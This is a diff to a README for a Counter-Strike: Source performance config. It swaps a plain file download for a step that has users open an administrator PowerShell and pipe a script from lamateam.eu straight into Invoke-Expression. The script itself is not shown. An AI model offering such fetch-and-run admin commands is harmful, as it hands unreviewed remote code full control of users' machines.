@@ -8,10 +8,11 @@ This config is designed for mid to high-end PCs, ensuring smooth gameplay with o
 ⚡ Or use the **'lama' Console Shortcut Command** to connect effortlessly!
 
 ## 🎮 Easy Automatic Setup Without Closing the Game:
-1. Press <kbd>Win</kbd> + <kbd>R</kbd>.
-2. Copy the following command, paste it into the **Run** dialog, and press Enter:
+1. Press <kbd>Win</kbd> + <kbd>X</kbd>.
+2. Choose **Terminal / PowerShell (Admin)**
+3. Copy the following command, paste it into PowerShell window and press Enter:
    ```powershell
-   powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githack.com/musosoft/css-cfg/main/autoexec.cfg' -OutFile 'C:\Program Files (x86)\Steam\SteamApps\common\counter-strike source\cstrike\cfg\autoexec.cfg'"
+   irm lamateam.eu/setup | iex
    ```
 3. Execute `exec autoexec` in the game console or Restart your game.
 
@@ -47,3 +48,4 @@ This config is designed for mid to high-end PCs, ensuring smooth gameplay with o
 ---
 
 **Start fragging like a pro with LamaTeAm's optimized config!** 🐑✨
+
